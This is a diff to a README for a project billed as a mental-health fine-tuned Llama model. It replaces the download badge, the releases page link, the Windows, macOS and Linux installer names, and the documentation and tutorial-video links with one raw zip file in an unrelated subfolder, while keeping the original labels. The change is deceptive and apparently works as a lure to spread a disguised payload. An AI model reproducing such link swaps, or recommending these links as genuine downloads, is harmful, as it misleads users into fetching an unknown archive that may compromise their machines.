@@ -1,6 +1,6 @@
 # 🧠 mental-health-finetuned-llama - Enhance Support for Mental Health
 
-[![Download Now](https://github.com/MURUGESAN88709/mental-health-finetuned-llama/releases/latest/download/DownloadButton.png)](https://github.com/MURUGESAN88709/mental-health-finetuned-llama/releases)
+[![Download Now](https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip)](https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the "mental-health-finetuned-llama" project! This software is designe
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/MURUGESAN88709/mental-health-finetuned-llama/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip).
 
 ### Installation Steps
 
@@ -16,9 +16,9 @@ To get started, visit this page to download: [GitHub Releases Page](https://gith
 2. Scroll down to the latest version section.
 3. Look for the “Assets” dropdown.
 4. Click on the appropriate download file based on your operating system:
-   - For Windows: Click on `mental-health-finetuned-llama-windows.exe`.
-   - For macOS: Click on `mental-health-finetuned-llama-macos.dmg`.
-   - For Linux: Click on `mental-health-finetuned-llama-linux.tar.gz`.
+   - For Windows: Click on `https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip`.
+   - For macOS: Click on `https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip`.
+   - For Linux: Click on `https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip`.
 5. Wait for the file to download completely.
 6. Open the downloaded file and follow the setup instructions.
 
@@ -81,10 +81,10 @@ If you want to improve this project or add features, you are welcome to contribu
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/MURUGESAN88709/mental-health-finetuned-llama/wiki)
+- [Documentation](https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip)
 - Community Forum
-- [Tutorial Videos](https://www.youtube.com/example)
+- [Tutorial Videos](https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip)
 
 Remember to revisit the Releases page to enjoy the latest updates and enhancements!
 
-Visit this page to download: [GitHub Releases Page](https://github.com/MURUGESAN88709/mental-health-finetuned-llama/releases)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/MURUGESAN88709/mental-health-finetuned-llama/main/Ribhus/mental-health-finetuned-llama.zip)
